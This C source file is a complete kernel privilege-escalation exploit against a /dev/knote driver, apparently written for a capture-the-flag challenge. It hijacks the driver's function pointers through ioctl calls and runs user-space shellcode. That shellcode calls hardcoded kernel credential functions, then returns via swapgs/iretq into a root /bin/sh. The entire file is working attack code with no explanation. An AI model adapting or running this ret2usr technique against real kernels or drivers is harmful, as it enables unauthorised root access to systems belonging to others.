#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>

#define KNOTE_CREATE  0x1337
#define KNOTE_ENCRYPT 0x133a

int fd;

typedef struct
{
    char *data;
    size_t len;
    void (*encrypt_func) (char *, size_t);
    void (*decrypt_func) (char *, size_t);
}
knote;

typedef struct
{
    unsigned long idx;
    char *data;
    size_t len;
}
knote_user;

void create(unsigned long idx, char *data, size_t len)
{
    knote_user note = { idx, data, len };
    ioctl(fd, KNOTE_CREATE, &note);
}

void encrypt(unsigned long idx, char *data, size_t len)
{
    knote_user note = { idx, data, len };
    ioctl(fd, KNOTE_ENCRYPT, &note);
}

void shell()
{
    system("/bin/sh");
    exit(0);
}

unsigned long proc_cs, proc_rflags, proc_ss, proc_rsp;
unsigned long proc_rip = (unsigned long) shell;

void backup()
{
    __asm__
    (
        ".intel_syntax noprefix;"
        "mov proc_cs, cs;"
        "mov proc_ss, ss;"
        "mov proc_rsp, rsp;"
        "pushf;"
        "pop proc_rflags;"
        ".att_syntax;"
    );
}

void shellcode()
{
    __asm__
    (
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rax, 0xffffffff81053c50;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, 0xffffffff81053a30;"
        "call rax;"
        "swapgs;"
        "mov r15, proc_ss;"
        "push r15;"
        "mov r15, proc_rsp;"
        "push r15;"
        "mov r15, proc_rflags;"
        "push r15;"
        "mov r15, proc_cs;"
        "push r15;"
        "mov r15, proc_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main()
{
    fd = open("/dev/knote", O_RDONLY);
    create(0, (char *) 0x0, 32);

    backup();

    knote payload = { "exploit", 5, &shellcode, &shellcode };
    create(1, (char *) &payload, 32);

    encrypt(0, "exploit", 5);

    return 0;
}
